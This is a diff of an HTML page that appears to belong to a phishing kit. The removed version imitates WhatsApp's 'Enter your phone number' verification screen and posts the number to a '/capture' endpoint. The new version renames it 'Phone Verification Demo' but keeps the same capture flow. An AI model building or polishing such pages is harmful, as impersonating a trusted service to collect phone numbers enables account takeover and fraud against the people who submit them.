@@ -3,51 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Verification - Step 1</title>
-    <link rel="stylesheet" href="/static/style.css">
+
+    <title>Phone Verification Demo</title>
+
+    <link rel="stylesheet" href="static/style.css">
 </head>
+
 <body>
 
-    <form action="/capture" method="POST" class="form-wrapper" id="step1Form">
-        <div class="wrapper">
-            <div class="step-view active">
-                <div class="header-top">
-                    <span class="close-icon">&times;</span>
-                    <span class="menu-icon">&#8942;</span>
-                </div>
-                <h2>Enter your phone number</h2>
-                <div class="instructions">
-                    WhatsApp will verify your account. <a href="#" class="help-link">What's my phone number?</a>
-                </div>
+<div class="app">
 
-                <div class="input-group-container">
-                    <!-- Country Selector -->
-                    <div class="select-wrapper">
-                        <select id="countrySelect" name="country_name">
-                            <option value="Nigeria" selected>Nigeria</option>
-                            <option value="United States">United States</option>
-                            <option value="United Kingdom">United Kingdom</option>
-                            <option value="India">India</option>
-                        </select>
-                    </div>
+    <header class="topbar">
+        <button class="back-button" type="button">←</button>
+        <button class="menu-button" type="button">⋮</button>
+    </header>
 
-                    <!-- Phone Input Row -->
-                    <div class="phone-row">
-                        <input type="text" id="countryCodeInput" name="cc" class="cc-input" value="+ 234" readonly>
-                        <div class="phone-input-wrapper" style="flex-grow: 1;">
-                            <input type="tel" id="phoneNumberInput" name="phone" placeholder="Phone number" autocomplete="tel-national" required autofocus>
-                        </div>
-                    </div>
-                </div>
+    <main class="content">
+
+        <h1>Enter your phone number</h1>
+
+        <p class="description">
+            Enter your phone number to continue with this demonstration.
+        </p>
+
+        <form action="/capture" method="POST"id="phoneForm">
+
+            <div class="country-wrapper">
+
+                <label for="country">Country</label>
+
+                <select
+                    id="country"
+                    name="country"
+                    required
+                >
+                    <option value="Nigeria" data-code="+234">
+                        Nigeria
+                    </option>
+
+                    <option value="Ghana" data-code="+233">
+                        Ghana
+                    </option>
+
+                    <option value="Kenya" data-code="+254">
+                        Kenya
+                    </option>
+
+                    <option value="United Kingdom" data-code="+44">
+                        United Kingdom
+                    </option>
+                </select>
+
             </div>
-        </div>
 
-        <!-- Persistent Bottom Action Button -->
-        <div class="action-container">
-            <button type="submit" class="btn-next" id="nextBtn">Next</button>
-        </div>
-    </form>
+            <div class="phone-row">
 
-    <script src="static/script.js"></script>
+                <div class="dial-code-wrapper">
+
+                    <label for="dialCode">Code</label>
+
+                    <input
+                        type="text"
+                        id="dialCode"
+                        name="dialCode"
+                        value="+234"
+                        readonly
+                    >
+
+                </div>
+
+                <div class="phone-input-wrapper">
+
+                    <label for="phoneNumber">Phone number</label>
+
+                    <input
+                        type="tel"
+                        id="phoneNumber"
+                        name="phoneNumber"
+                        placeholder="Phone number"
+                        inputmode="numeric"
+                        autocomplete="tel-national"
+                        maxlength="15"
+                        required
+                    >
+
+                </div>
+
+            </div>
+
+            <p id="phoneError" class="error-message"></p>
+
+            <button
+                type="submit"
+                id="nextButton"
+                class="primary-button"
+                disabled
+            >
+                Next
+            </button>
+
+        </form>
+
+    </main>
+
+    <footer class="bottom-bar">
+        <span></span>
+    </footer>
+
+</div>
+
+<script src="static/script.js"></script>
+
 </body>
 </html>
